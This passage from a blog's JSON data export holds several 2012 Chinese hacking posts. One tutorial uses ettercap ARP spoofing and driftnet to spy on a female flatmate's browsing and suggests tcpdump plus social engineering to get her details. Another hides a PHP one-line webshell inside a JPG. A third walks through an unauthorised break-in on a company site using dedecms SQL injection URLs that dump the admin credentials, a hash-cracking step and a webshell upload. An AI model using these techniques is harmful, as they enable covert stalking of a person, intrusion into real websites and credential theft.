的思想就试试看看能crack掉不.</p>\n<p>首先分析下游戏</p>\n<p>游戏对象：</p>\n<p>飞机，子弹，炸弹，敌机<br>实现方法就有多种成为无敌的方法:</p>\n<p>1.让飞机无敌，也就是不死</p>\n<p>2.让子弹威力变大，并且不消失,这样一个子弹就可以打多个敌机</p>\n<p>3.给自己添加”大量”炸弹,这样也就无敌了</p>\n<p>4.让敌机碰到自己无效,这样就相当于隐形模式了,同样无敌了</p>\n<p>5.给自己多加几条名，这样既可以达到无敌的方式又可以死掉（方便提交分数）不然死都死不掉。</p>\n","_id":"jdfgtor0t0tojay5","comments":true,"layout":"post","photos":[],"link":""},{"title":"Arp欺骗攻击的另类应用之屌丝泡妞记","id":244,"date":1351267523000,"tags":["36asgcbg77ro47zm","jkky4aubcnchozqa"],"categories":["ng1ki7p1v08zbwrz"],"content":"<p>EveryNote 真是个好动西，跨平台的笔记本。好到，平时记录一些自己的东西，都懒得在写博客了。呵呵，很久都</p>\n<p>没有写文章了。最近一切烦心事一大堆，就弄个好玩的东西来玩玩。Arp欺骗的另类应用，为啥说是arp欺骗的另类</p>\n<p>应用呢？假设合租屋里隔壁有个漂亮MM，想知道他平时都上网干些什么，喜欢什么，怎么弄到她的联系方式？</p>\n<p>嘿嘿，接着往下看看。</p>\n<p>arp欺骗，我想大家都应该知道怎么回事了。不知道的去问度娘。。。</p>\n<p>就不废话了，还是直接上图上教程比较实在。环境，ubuntu 12.10 当然你也可以是ubuntu的其他版本。或者其他linux</p>\n<p>系统。环境如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/10/001.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/10/001.png\" alt=\"\" title=\"001\"></a></p>\n<p>Arp欺骗工具我们就用ettercap吧，经典工具我就不多说了。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get <span class=\"operator\"><span class=\"keyword\">install</span>  ettercap-<span class=\"built_in\">text</span>-<span class=\"keyword\">only</span>  //安装纯字符界面的ettercap</span></div></pre></td></tr></table></figure>\n\n<a id=\"more\"></a>\n\n<p>上面命令就可以直接安装它了，因为ubuntu软件仓储里面已经有了，直接可以进行安装。我已经装好了，版本信息如下：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/10/002.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/10/002.png\" alt=\"\" title=\"002\"></a></p>\n<p>还需要安装一个东西，也是今天的主角：driftnet</p>\n<p>估计linux 的同学应该都很少有人知道这个是神码玩意吧，我就先说说它的作用吧，driftnet是一款</p>\n<p>用于抓取指定接口数据流上面图片的软件并且吧嗅探到的图片友好的显示在一个窗口当中。</p>\n<p>ubuntu安装命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">sudo</span> apt-get install driftnet</div></pre></td></tr></table></figure>\n\n<p>看看我的版本信息吧：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/10/0031.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/10/0031.png\" alt=\"\" title=\"003\"></a></p>\n<p>装完这些估计有人就会问了，这个和MM有神码联系？</p>\n<p>额，好吧，那就说说怎么个联系法。</p>\n<p>先看张流程图片：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/10/005.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/10/005.png\" alt=\"\" title=\"005\"></a></p>\n<p>这张图片已经说明了我们要做什么了，和怎么去做了，那么下来我们就进行实践操作。</p>\n<p>首先，我们需要进行Arp欺骗，把MM的PC欺骗过来，欺骗过来后，MM那边的所有数据都是通过通过我们的机器</p>\n<p>再出去（外网）的。</p>\n<p>首先以知MM ip地址：192.168.1.100    网关地址：192.168.1.253</p>\n<p>使用下面命令进行欺骗</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo ettercap -i wlan0  -T -M arp:remote <span class=\"regexp\">/192.168.1.253/</span> <span class=\"regexp\">/192.168.1.100/</span>   <span class=\"comment\">//记住需要root权限</span></div></pre></td></tr></table></figure>\n\n<p>注意：我这里用-i wlan0是因为我自己用的是无线，根据实际情况自行操作</p>\n<p>输入命令后的效果如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/10/006.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/10/006.png\" alt=\"\" title=\"006\"></a></p>\n<p>然后我们需要用到我们的主角了，driftnet</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"title\">driftnet</span> -i wlan0</div></pre></td></tr></table></figure>\n\n<p>运行后随便浏览下带有图片的网站效果如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/10/007.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/10/007.png\" alt=\"\" title=\"007\"></a></p>\n<p>调整好浏览图片的窗口，然后我们就等着MM上网呗。这里当然只能自己做实验了，因为宽带独享。。。。。</p>\n<p>手里只有个ipad那就欺骗它来看看欺骗效果。手机也可以欺骗哦。</p>\n<p>电脑截图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/10/009.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/10/009.png\" alt=\"\" title=\"009\"></a></p>\n<p>怎么样？效果似乎不错是吧？嘿嘿，最后再来一张手机拍的PC和ipad的合照，这样也可以有个对照参考，如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/10/008.jpg\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/10/008.jpg\" alt=\"\" title=\"008\"></a></p>\n<blockquote>\n<p>再给点提示，以便屌丝们可以获取更多信息，tcpdump是linux比较有名的抓包工具，利用tcpdump可以抓取更详细的信息，这样再结合社会工程学，我想MM的信息肯定是跑步掉了！</p>\n</blockquote>\n<p>以后有时间再写一个dns欺骗之最终泡妞必杀技！嘿嘿。。。</p>\n","source":"_posts/arp欺骗攻击的另类应用之屌丝泡妞记.md","raw":"title: \"Arp欺骗攻击的另类应用之屌丝泡妞记\"\nid: 244\ndate: 2012-10-27 00:05:23\ntags: \n- arp欺骗\n- linux arp欺骗\ncategories: \n- 原创作品\n---\n\nEveryNote 真是个好动西，跨平台的笔记本。好到，平时记录一些自己的东西，都懒得在写博客了。呵呵，很久都\n\n没有写文章了。最近一切烦心事一大堆，就弄个好玩的东西来玩玩。Arp欺骗的另类应用，为啥说是arp欺骗的另类\n\n应用呢？假设合租屋里隔壁有个漂亮MM，想知道他平时都上网干些什么，喜欢什么，怎么弄到她的联系方式？\n\n嘿嘿，接着往下看看。\n\narp欺骗，我想大家都应该知道怎么回事了。不知道的去问度娘。。。\n\n就不废话了，还是直接上图上教程比较实在。环境，ubuntu 12.10 当然你也可以是ubuntu的其他版本。或者其他linux\n\n系统。环境如图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/10/001.png \"001\")](http://asset.creturn.com/asset/uploads/2012/10/001.png)\n\nArp欺骗工具我们就用ettercap吧，经典工具我就不多说了。\n\n```shell\nsudo apt-get install  ettercap-text-only  //安装纯字符界面的ettercap\n```\n\n<!--more-->\n\n上面命令就可以直接安装它了，因为ubuntu软件仓储里面已经有了，直接可以进行安装。我已经装好了，版本信息如下：\n\n[![](http://asset.creturn.com/asset/uploads/2012/10/002.png \"002\")](http://asset.creturn.com/asset/uploads/2012/10/002.png)\n\n还需要安装一个东西，也是今天的主角：driftnet\n\n估计linux 的同学应该都很少有人知道这个是神码玩意吧，我就先说说它的作用吧，driftnet是一款\n\n用于抓取指定接口数据流上面图片的软件并且吧嗅探到的图片友好的显示在一个窗口当中。\n\nubuntu安装命令：\n\n```shell\nsudo apt-get install driftnet\n```\n\n看看我的版本信息吧：\n\n[![](http://asset.creturn.com/asset/uploads/2012/10/0031.png \"003\")](http://asset.creturn.com/asset/uploads/2012/10/0031.png)\n\n装完这些估计有人就会问了，这个和MM有神码联系？\n\n额，好吧，那就说说怎么个联系法。\n\n先看张流程图片：\n\n[![](http://asset.creturn.com/asset/uploads/2012/10/005.png \"005\")](http://asset.creturn.com/asset/uploads/2012/10/005.png)\n\n这张图片已经说明了我们要做什么了，和怎么去做了，那么下来我们就进行实践操作。\n\n首先，我们需要进行Arp欺骗，把MM的PC欺骗过来，欺骗过来后，MM那边的所有数据都是通过通过我们的机器\n\n再出去（外网）的。\n\n首先以知MM ip地址：192.168.1.100    网关地址：192.168.1.253\n\n使用下面命令进行欺骗\n\n```shell\nsudo ettercap -i wlan0  -T -M arp:remote /192.168.1.253/ /192.168.1.100/   //记住需要root权限\n```\n\n注意：我这里用-i wlan0是因为我自己用的是无线，根据实际情况自行操作\n\n输入命令后的效果如图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/10/006.png \"006\")](http://asset.creturn.com/asset/uploads/2012/10/006.png)\n\n然后我们需要用到我们的主角了，driftnet\n\n```shell\ndriftnet -i wlan0\n```\n\n运行后随便浏览下带有图片的网站效果如图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/10/007.png \"007\")](http://asset.creturn.com/asset/uploads/2012/10/007.png)\n\n调整好浏览图片的窗口，然后我们就等着MM上网呗。这里当然只能自己做实验了，因为宽带独享。。。。。\n\n手里只有个ipad那就欺骗它来看看欺骗效果。手机也可以欺骗哦。\n\n电脑截图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/10/009.png \"009\")](http://asset.creturn.com/asset/uploads/2012/10/009.png)\n\n怎么样？效果似乎不错是吧？嘿嘿，最后再来一张手机拍的PC和ipad的合照，这样也可以有个对照参考，如图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/10/008.jpg \"008\")](http://asset.creturn.com/asset/uploads/2012/10/008.jpg)\n\n>再给点提示，以便屌丝们可以获取更多信息，tcpdump是linux比较有名的抓包工具，利用tcpdump可以抓取更详细的信息，这样再结合社会工程学，我想MM的信息肯定是跑步掉了！\n\n以后有时间再写一个dns欺骗之最终泡妞必杀技！嘿嘿。。。\n","slug":"arp欺骗攻击的另类应用之屌丝泡妞记","updated":1421659126000,"excerpt":"<p>EveryNote 真是个好动西，跨平台的笔记本。好到，平时记录一些自己的东西，都懒得在写博客了。呵呵，很久都</p>\n<p>没有写文章了。最近一切烦心事一大堆，就弄个好玩的东西来玩玩。Arp欺骗的另类应用，为啥说是arp欺骗的另类</p>\n<p>应用呢？假设合租屋里隔壁有个漂亮MM，想知道他平时都上网干些什么，喜欢什么，怎么弄到她的联系方式？</p>\n<p>嘿嘿，接着往下看看。</p>\n<p>arp欺骗，我想大家都应该知道怎么回事了。不知道的去问度娘。。。</p>\n<p>就不废话了，还是直接上图上教程比较实在。环境，ubuntu 12.10 当然你也可以是ubuntu的其他版本。或者其他linux</p>\n<p>系统。环境如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/10/001.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/10/001.png\" alt=\"\" title=\"001\"></a></p>\n<p>Arp欺骗工具我们就用ettercap吧，经典工具我就不多说了。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get <span class=\"operator\"><span class=\"keyword\">install</span>  ettercap-<span class=\"built_in\">text</span>-<span class=\"keyword\">only</span>  //安装纯字符界面的ettercap</span></div></pre></td></tr></table></figure>\n\n","_id":"td4f36ekolwmmdod","comments":true,"layout":"post","photos":[],"link":""},{"title":"Backtrack5 armitage 自动化攻击演示","id":75,"date":1341120832000,"tags":["cpfaxeok03mr6lu8","zrf9xfcmwp9expxl","8djsjm1510afbi6l"],"categories":["ng1ki7p1v08zbwrz"],"content":"<p>这段视频是之前进一个论坛获取邀请码的一个作品，视频介绍了如何通过 Backtrack5 平台 下的armitage进行自动化攻击，并且完全控制目标主机</p>\n<p>armitage其实就是msf的一个GUI前端工具。本视频就是通过它来进行演示自动化攻击，其中也演示了两款不错的软件，</p>\n<p>具体的大家自己看吧。</p>\n<p>优酷上也传了一份但是很不清晰，视频录制过程中采用的是vm自带的录制工具所以效果及其差，也比较卡顿…</p>\n<object width=\"100%\" classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0\" align=\"middle\"><param name=\"src\" value=\"http://player.youku.com/player.php/sid/XNDExODA1Mjgw/v.swf\"><param name=\"allowfullscreen\" value=\"true\"><param name=\"quality\" value=\"high\"><param name=\"allowscriptaccess\" value=\"always\"><embed width=\"100%\" height=\"400\" type=\"application/x-shockwave-flash\" src=\"http://player.youku.com/player.php/sid/XNDExODA1Mjgw/v.swf\" allowfullscreen=\"true\" quality=\"high\" allowscriptaccess=\"always\" align=\"middle\"></object>\n\n<p>下载地址：<a href=\"http://www.kuaipan.cn/file/id_22592043373042208.html\" target=\"_blank\" rel=\"external\">http://www.kuaipan.cn/file/id_22592043373042208.html</a></p>\n","source":"_posts/backtrack5-armitage-自动化攻击演示.md","raw":"title: \"Backtrack5 armitage 自动化攻击演示\"\nid: 75\ndate: 2012-07-01 13:33:52\ntags: \n- armitage\n- Backtrack5\n- 自动化攻击\ncategories: \n- 原创作品\n---\n\n这段视频是之前进一个论坛获取邀请码的一个作品，视频介绍了如何通过 Backtrack5 平台 下的armitage进行自动化攻击，并且完全控制目标主机\n\narmitage其实就是msf的一个GUI前端工具。本视频就是通过它来进行演示自动化攻击，其中也演示了两款不错的软件，\n\n具体的大家自己看吧。\n\n优酷上也传了一份但是很不清晰，视频录制过程中采用的是vm自带的录制工具所以效果及其差，也比较卡顿...\n\n<object width=\"100%\"  classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0\" align=\"middle\"><param name=\"src\" value=\"http://player.youku.com/player.php/sid/XNDExODA1Mjgw/v.swf\" /><param name=\"allowfullscreen\" value=\"true\" /><param name=\"quality\" value=\"high\" /><param name=\"allowscriptaccess\" value=\"always\" /><embed width=\"100%\" height=\"400\" type=\"application/x-shockwave-flash\" src=\"http://player.youku.com/player.php/sid/XNDExODA1Mjgw/v.swf\" allowfullscreen=\"true\" quality=\"high\" allowscriptaccess=\"always\" align=\"middle\" /></object>\n\n下载地址：[http://www.kuaipan.cn/file/id_22592043373042208.html](http://www.kuaipan.cn/file/id_22592043373042208.html)\n","slug":"backtrack5-armitage-自动化攻击演示","updated":1421659126000,"excerpt":"","_id":"jmgnnj7ztqamyqzb","comments":true,"layout":"post","photos":[],"link":""},{"title":"Copy命令制作图马和隐藏文件","id":119,"date":1342588625000,"tags":["q76ywjwe13c2l140","docffg98dif5d9r0"],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i"],"content":"<p>好几天没写BLog了，就写一个利用copy命令制作图马和隐藏文件到图片里面的教程吧</p>\n<p>首先看下copy 命令的参数（百科直接copy来的）：</p>\n<figure class=\"highlight bat\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">COPY</span> [/D] [/V] [/N] [/Y | /-Y] [/Z] [/A | /B ] source [/A | /B]</div><div class=\"line\">[+ source [/A | /B] [+ ...]] [destination [/A | /B]]</div></pre></td></tr></table></figure>\n\n<blockquote>\n<p>source 指定要复制的文件。</p>\n<p>/A 表示一个 ASCII 文本文件。</p>\n<p>/B 表示一个二进位文件。</p>\n<p>/D 允许解密要创建的目标文件destination 为新文件指定目录和/或文件名。</p>\n<p>/V 验证新文件写入是否正确。</p>\n<p>/N 复制带有非 8dot3 名称的文件时，尽可能使用短文件名。</p>\n<p>/Y 不使用确认是否要覆盖现有目标文件的提示。</p>\n<p>/-Y 使用确认是否要覆盖现有目标文件的提示。</p>\n<p>/Z 用可重新启动模式复制已联网的文件<br><a id=\"more\"></a><br>首先准备一个图片，和一个一句话木马，如图：</p>\n</blockquote>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/tuma1.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/tuma1.png\" alt=\"\" title=\"tuma1\"></a></p>\n<p>然后打开cmd 切换到测试目录：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/tuma2.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/tuma2.png\" alt=\"\" title=\"tuma2\"></a></p>\n<p>然后进行我们的图马合成，输入命令：copy mm.jpg/b + ma.txt/a tuma.jpg</p>\n<p>注意：copy 图马名称/b +一句话/a 生成文件名</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/tuma3.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/tuma3.png\" alt=\"\" title=\"tuma3\"></a></p>\n<p>看看生成图马的预览图完全能够显示成图片：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/tuma4.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/tuma4.png\" alt=\"\" title=\"tuma4\"></a></p>\n<p>然后用记事本或者任何文本编辑器打开ma.jpg</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/tuma5.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/tuma5.png\" alt=\"\" title=\"tuma5\"></a></p>\n<p>可以看到一句话已经插入到文件中，用菜刀测试下看看行不行，记住把生成的</p>\n<p>图马改成php(当然我写如的是php一句话，根据你自己情况自行修改)</p>\n<p>看看截图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/tuma6.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/tuma6.png\" alt=\"\" title=\"tuma6\"></a></p>\n<p>可以看到正常解析。</p>\n<p>接下来演示如何隐藏文件到图片中，如图所示，我要把压缩文件隐藏到图片当中如图：</p>\n<p>把一句话打包成rar文件，然后进行合并命令：copy mm.jpg/b + ma.rar/b newmm.jpg</p>\n<p>打包文件如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/tuma7.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/tuma7.png\" alt=\"\" title=\"tuma7\"></a></p>\n<p>合并命令：copy mm.jpg/b + ma.rar/b newmm.jpg</p>\n<p>看看合并结果：newmm.jpg</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/tuma8.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/tuma8.png\" alt=\"\" title=\"tuma8\"></a></p>\n<p>可以看到newmm.jpg文件是我们合成后的文件，并且里面已经隐藏了一个rar文件</p>\n<p>接下来我们看看我们隐藏的文件是否损坏，把newmm.jpg改成newmm.rar看看：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/tuma9.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/tuma9.png\" alt=\"\" title=\"tuma9\"></a></p>\n<p>可以看到里面打包的文件完全正常~</p>\n","source":"_posts/copy命令制作图马和隐藏文件.md","raw":"title: \"Copy命令制作图马和隐藏文件\"\nid: 119\ndate: 2012-07-18 13:17:05\ntags: \n- 图马\n- 隐藏私密文件\ncategories: \n- 原创作品\n- 技术文章\n---\n\n好几天没写BLog了，就写一个利用copy命令制作图马和隐藏文件到图片里面的教程吧\n\n首先看下copy 命令的参数（百科直接copy来的）：\n```bat\nCOPY [/D] [/V] [/N] [/Y | /-Y] [/Z] [/A | /B ] source [/A | /B]\n[+ source [/A | /B] [+ ...]] [destination [/A | /B]]\n```\n\n>source 指定要复制的文件。\n\n>/A 表示一个 ASCII 文本文件。\n\n>/B 表示一个二进位文件。\n\n>/D 允许解密要创建的目标文件destination 为新文件指定目录和/或文件名。\n\n>/V 验证新文件写入是否正确。\n\n>/N 复制带有非 8dot3 名称的文件时，尽可能使用短文件名。\n\n>/Y 不使用确认是否要覆盖现有目标文件的提示。\n\n>/-Y 使用确认是否要覆盖现有目标文件的提示。\n\n>/Z 用可重新启动模式复制已联网的文件\n<!--more-->\n首先准备一个图片，和一个一句话木马，如图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/tuma1.png \"tuma1\")](http://asset.creturn.com/asset/uploads/2012/07/tuma1.png)\n\n然后打开cmd 切换到测试目录：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/tuma2.png \"tuma2\")](http://asset.creturn.com/asset/uploads/2012/07/tuma2.png)\n\n然后进行我们的图马合成，输入命令：copy mm.jpg/b + ma.txt/a tuma.jpg\n\n注意：copy 图马名称/b +一句话/a 生成文件名\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/tuma3.png \"tuma3\")](http://asset.creturn.com/asset/uploads/2012/07/tuma3.png)\n\n看看生成图马的预览图完全能够显示成图片：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/tuma4.png \"tuma4\")](http://asset.creturn.com/asset/uploads/2012/07/tuma4.png)\n\n然后用记事本或者任何文本编辑器打开ma.jpg\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/tuma5.png \"tuma5\")](http://asset.creturn.com/asset/uploads/2012/07/tuma5.png)\n\n可以看到一句话已经插入到文件中，用菜刀测试下看看行不行，记住把生成的\n\n图马改成php(当然我写如的是php一句话，根据你自己情况自行修改)\n\n看看截图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/tuma6.png \"tuma6\")](http://asset.creturn.com/asset/uploads/2012/07/tuma6.png)\n\n可以看到正常解析。\n\n接下来演示如何隐藏文件到图片中，如图所示，我要把压缩文件隐藏到图片当中如图：\n\n把一句话打包成rar文件，然后进行合并命令：copy mm.jpg/b + ma.rar/b newmm.jpg\n\n打包文件如图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/tuma7.png \"tuma7\")](http://asset.creturn.com/asset/uploads/2012/07/tuma7.png)\n\n合并命令：copy mm.jpg/b + ma.rar/b newmm.jpg\n\n看看合并结果：newmm.jpg\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/tuma8.png \"tuma8\")](http://asset.creturn.com/asset/uploads/2012/07/tuma8.png)\n\n可以看到newmm.jpg文件是我们合成后的文件，并且里面已经隐藏了一个rar文件\n\n接下来我们看看我们隐藏的文件是否损坏，把newmm.jpg改成newmm.rar看看：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/tuma9.png \"tuma9\")](http://asset.creturn.com/asset/uploads/2012/07/tuma9.png)\n\n可以看到里面打包的文件完全正常~\n","slug":"copy命令制作图马和隐藏文件","updated":1421659126000,"excerpt":"<p>好几天没写BLog了，就写一个利用copy命令制作图马和隐藏文件到图片里面的教程吧</p>\n<p>首先看下copy 命令的参数（百科直接copy来的）：</p>\n<figure class=\"highlight bat\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">COPY</span> [/D] [/V] [/N] [/Y | /-Y] [/Z] [/A | /B ] source [/A | /B]</div><div class=\"line\">[+ source [/A | /B] [+ ...]] [destination [/A | /B]]</div></pre></td></tr></table></figure>\n\n<blockquote>\n<p>source 指定要复制的文件。</p>\n<p>/A 表示一个 ASCII 文本文件。</p>\n<p>/B 表示一个二进位文件。</p>\n<p>/D 允许解密要创建的目标文件destination 为新文件指定目录和/或文件名。</p>\n<p>/V 验证新文件写入是否正确。</p>\n<p>/N 复制带有非 8dot3 名称的文件时，尽可能使用短文件名。</p>\n<p>/Y 不使用确认是否要覆盖现有目标文件的提示。</p>\n<p>/-Y 使用确认是否要覆盖现有目标文件的提示。</p>\n<p>/Z 用可重新启动模式复制已联网的文件<br>","_id":"q6fjjsvgcsa20yxc","comments":true,"layout":"post","photos":[],"link":""},{"title":"dedecms v5.7 注入漏洞利用","id":137,"date":1342712746000,"tags":["ch1yl1a4oa8rmcdk","7oe5pwzvyvwy1unb"],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i"],"content":"<p>dedecms 的这个漏洞已经是老漏洞了，只不过今天同学给我说他明天去面试</p>\n<p>所以就顺手给他去面试的那家公司做个安全测试，就把过程记录下来吧：</p>\n<p>首先打开目标站点：</p>\n<p>右击查看网站源代码，发现几个比较特殊的地方：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/dede_source.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/dede_source.png\" alt=\"\" title=\"dede_source\"></a></p>\n<p>可以看到根目录有a文件夹和uploads，对于dedecms熟悉的人都知道，dedecms有a和uploads/allimg目录，</p>\n<p>抱着试试的心态目标站点后面加上member看看，一般做二次开发不带会员中心的话member基本还是原因，</p>\n<p>也就能判断出目标系统：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/dede_cms.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/dede_cms.png\" alt=\"\" title=\"dede_cms\"></a></p>\n<p>可以清楚的看到目标是dedecms系统<br><a id=\"more\"></a><br>那么继续看看他的最好更新时间确认下他是否是最新版本如果不是最新版本那么存在漏洞的可能性就很大了：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/dede_var.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/dede_var.png\" alt=\"\" title=\"dede_var\"></a></p>\n<p>可以看到最后一次更新时间是2011-10-15 看到这个基本能保证有可能存在漏洞。</p>\n<p>dedeCMS的默认后台大家应该都知道，目标后面加上dede，结果真出来了，其实</p>\n<p>一般情况下很少有人把dede不重命名的。</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/dede_admin.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/dede_admin.png\" alt=\"\" title=\"dede_admin\"></a></p>\n<p>默认试了下admin没有此用户</p>\n<p>网上搜下2012年以前的漏洞,找到一个注入漏洞和一个上传漏洞：</p>\n<p>既然有后台就先试试注入吧：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">/member/ajax_membergroup.php?action=post&amp;membergroup=@`<span class=\"string\">'` Union select userid from `%23@__admin` where 1 or id=@`'</span>`</div></pre></td></tr></table></figure>\n\n<p>这句是爆出用户名的:</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/dede_user.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/dede_user.png\" alt=\"\" title=\"dede_user\"></a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">/member/ajax_membergroup.php?action=post&amp;membergroup=@`<span class=\"string\">'` Union select pwd from `%23@__admin` where 1 or id=@`'</span>`</div></pre></td></tr></table></figure>\n\n<p>这个是爆密码的：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/dede_pwd_new.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/dede_pwd_new.png\" alt=\"\" title=\"dede_pwd_new\"></a></p>\n<p>可以看到加密后的密码：9951b286c1329f303e3c</p>\n<p>dedecms加密方式有是substr(md5($pwd),5,20) 也就是md5加密后取得第5位开始取20位字符为密码</p>\n<p>那么把它还原成md5的16位加密算法就是去掉头部3为和后面1为就是16为md5:1b286c1329f303e3</p>\n<p>md5解密网站很多大家可以去找找，我是当时网站打不开就直接让群里哥们帮查的。</p>\n<p>看了下目标服务器是IIS6的那么直接就上传特殊后缀，让它解析成php吧：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/dede_server.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/dede_server.png\" alt=\"\" title=\"dede_server\"></a></p>\n<p>有了用户名，密码基本这个站点权限拿下了，后台上传一句话图马：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/dede_up_file.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/dede_up_file.png\" alt=\"\" title=\"dede_up_file\"></a></p>\n<p>传后直接菜刀连上：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/dede_caidao.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/dede_caidao.png\" alt=\"\" title=\"dede_caidao\"></a></p>\n<p>互联网上的安全其实是很重要的，再次还是提醒各位coder或者安全运维，互联网安全很重要的，稍微有点马虎</p>\n<p>可能造成严重的后果。还是希望大家把安全措施做好。</p>\n<p>如需转载本文请注明来源，负责后果自负！</p>\n","source":"_posts/dedecms-v5-7-注入漏洞利用.md","raw":"title: \"dedecms v5.7 注入漏洞利用\"\nid: 137\ndate: 2012-07-19 23:45:46\ntags: \n- dedecms漏洞\n- 注入漏洞\ncategories: \n- 原创作品\n- 